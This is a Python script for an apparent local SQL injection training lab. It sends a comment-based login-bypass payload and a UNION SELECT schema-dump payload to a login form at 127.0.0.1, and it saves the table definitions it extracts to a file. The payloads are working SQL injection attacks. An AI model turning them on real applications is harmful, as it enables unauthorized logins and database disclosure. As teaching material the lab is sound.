
import json
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

# Fixed endpoint: local training application only.
LOGIN_URL = "http://127.0.0.1:5000/login"


def submit_login(username, password):
    """Send form data to the local training application."""
    data = urlencode({
        "username": username,
        "password": password,
    }).encode("utf-8")

    request = Request(
        LOGIN_URL,
        data=data,
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        method="POST",
    )

    try:
        with urlopen(request, timeout=3) as response:
            body = response.read().decode("utf-8")
    except HTTPError as error:
        body = error.read().decode("utf-8", errors="replace")

    return json.loads(body)


def main():
    print("=== Local SQL Injection Training Lab ===")
    print("Target: 127.0.0.1 only\n")

    try:
        # Demonstration 1: test the vulnerable login condition
        print("[1] Testing login-bypass behavior...")

        result = submit_login(
            "admin' -- ",
            "incorrect-training-password",
        )

        if result.get("rows"):
            print("[+] Login bypass demonstrated in the lab.")
            print(json.dumps(result["rows"], indent=2))
        else:
            print("[-] No rows returned. Check the lab app.")

        # Demonstration 2: inspect the SQLite table definitions
        print("\n[2] Testing schema disclosure...")

        schema_payload = (
            "' UNION SELECT name, sql FROM sqlite_master "
            "WHERE type='table' -- "
        )

        schema_result = submit_login(
            schema_payload,
            "unused-training-value",
        )

        output_lines = []

        for row in schema_result.get("rows", []):
            table_name = row.get("username", "unknown")
            definition = row.get("role") or ""

            if definition:
                output_lines.append(
                    f"Table: {table_name}\n{definition}\n"
                )
                print(f"\nTable: {table_name}")
                print(definition)

        if output_lines:
            output_file = Path(__file__).with_name("schema_dump.txt")
            output_file.write_text(
                "\n".join(output_lines),
                encoding="utf-8",
            )
            print(f"\nSchema saved to: {output_file.name}")
        else:
            print("[-] No schema definitions returned.")

    except (URLError, TimeoutError, json.JSONDecodeError) as error:
        print(f"Lab request failed: {error}")
        print("Check that vulnerable_app.py is still running.")


if __name__ == "__main__":
    main()
